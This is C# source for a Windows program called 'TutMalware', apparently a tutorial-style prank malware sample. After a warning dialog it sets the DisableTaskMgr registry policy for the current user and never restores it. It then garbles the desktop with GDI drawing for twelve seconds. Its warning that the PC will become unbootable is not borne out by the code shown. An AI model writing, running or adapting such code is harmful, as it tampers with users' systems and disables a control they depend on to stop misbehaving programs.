using Microsoft.Win32;
using System;
using System.Drawing;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using TutMalware.Properties;

namespace TutMalware
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Drawer drawer1 = new Drawer1(); // instance of the drawer 1

            // Warning message
            if (MessageBox.Show("TutMalware will make your pc unbootable. Wanna continue?", "TutMalware Warning", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                // Disable stuff
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.Close();

                drawer1.Start(); // start the drawer1
                Thread.Sleep(12000);
                drawer1.Stop();
            }
        }

        class Drawer1 : Drawer
        {
            /**
             * This number will increase every cycle, and when reaches 20
             * the screen will be redrawed
             */
            int redrawCounter = 0;

            public override void Draw(IntPtr hdc)
            {
                // lezz draw something
                int blockW = 300; // width of vertical bars
                int blockH = 300; // height of horizontal bars
                int x = random.Next(0, screenW-blockW); // x of vertical bar
                int y = random.Next(0, screenH-blockH); // y of horizontal bar
                
                // move a horizontal bar up or down
                BitBlt(hdc, random.Next(-100, 101), y, screenW, blockH, hdc, 0, y, (int)CopyPixelOperation.SourceCopy);
                
                // move a vertical bar right or left
                BitBlt(hdc, x, random.Next(-100, 101), blockW, screenH, hdc, x, 0, (int)CopyPixelOperation.SourceCopy);

                redrawCounter++;
                if (redrawCounter >= 20)
                {
                    // when redraw counter reaches 20, we redraw and do some color effect
                    redrawCounter = 0;
                    Redraw();
                    IntPtr brush = CreateSolidBrush((uint)random.Next(0, 0xffffff + 1));
                    SelectObject(hdc, brush);
                    PatBlt(hdc, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
                    DeleteObject(brush);
                }

                Thread.Sleep(10);
            }
        }

        abstract class Drawer
        {
            public bool running = false; // this is set to true once Start() and when becomes false, the drawing thread stops
            public Random random = new Random();
            public int screenW = Screen.PrimaryScreen.Bounds.Width;
            public int screenH = Screen.PrimaryScreen.Bounds.Height;

            public void Start()
            {
                if (! running)
                {
                    // if this drawer was not already running, then we can start its thread
                    running = true;
                    new Thread(new ThreadStart(DrawLoop)).Start();
                }
            }

            public void Stop()
            {
                running = false;
            }

            void DrawLoop()
            {
                while (running)
                {
                    IntPtr desktop = GetDC(IntPtr.Zero); // get desktop drawing context

                    // you must know inheritance to understand this
                    Draw(desktop); // call the Draw() method which is different for every drawer

                    ReleaseDC(IntPtr.Zero, desktop); // release desktop drawing context
                }
            }

            public void Redraw()
            {
                RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.AllChildren | RedrawWindowFlags.Erase | RedrawWindowFlags.Invalidate);
            }

            public abstract void Draw(IntPtr hdc);
        }

        #region DLLImports

        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject([In] IntPtr hObject);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);
        [DllImport("user32.dll")]
        static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);
        [Flags()]
        private enum RedrawWindowFlags : uint
        {
            /// <summary>
            /// Invalidates the rectangle or region that you specify in lprcUpdate or hrgnUpdate.
            /// You can set only one of these parameters to a non-NULL value. If both are NULL, RDW_INVALIDATE invalidates the entire window.
            /// </summary>
            Invalidate = 0x1,

            /// <summary>Causes the OS to post a WM_PAINT message to the window regardless of whether a portion of the window is invalid.</summary>
            InternalPaint = 0x2,

            /// <summary>
            /// Causes the window to receive a WM_ERASEBKGND message when the window is repainted.
            /// Specify this value in combination with the RDW_INVALIDATE value; otherwise, RDW_ERASE has no effect.
            /// </summary>
            Erase = 0x4,

            /// <summary>
            /// Validates the rectangle or region that you specify in lprcUpdate or hrgnUpdate.
            /// You can set only one of these parameters to a non-NULL value. If both are NULL, RDW_VALIDATE validates the entire window.
            /// This value does not affect internal WM_PAINT messages.
            /// </summary>
            Validate = 0x8,

            NoInternalPaint = 0x10,

            /// <summary>Suppresses any pending WM_ERASEBKGND messages.</summary>
            NoErase = 0x20,

            /// <summary>Excludes child windows, if any, from the repainting operation.</summary>
            NoChildren = 0x40,

            /// <summary>Includes child windows, if any, in the repainting operation.</summary>
            AllChildren = 0x80,

            /// <summary>Causes the affected windows, which you specify by setting the RDW_ALLCHILDREN and RDW_NOCHILDREN values, to receive WM_ERASEBKGND and WM_PAINT messages before the RedrawWindow returns, if necessary.</summary>
            UpdateNow = 0x100,

            /// <summary>
            /// Causes the affected windows, which you specify by setting the RDW_ALLCHILDREN and RDW_NOCHILDREN values, to receive WM_ERASEBKGND messages before RedrawWindow returns, if necessary.
            /// The affected windows receive WM_PAINT messages at the ordinary time.
            /// </summary>
            EraseNow = 0x200,

            Frame = 0x400,

            NoFrame = 0x800
        }

        #endregion
    }
}
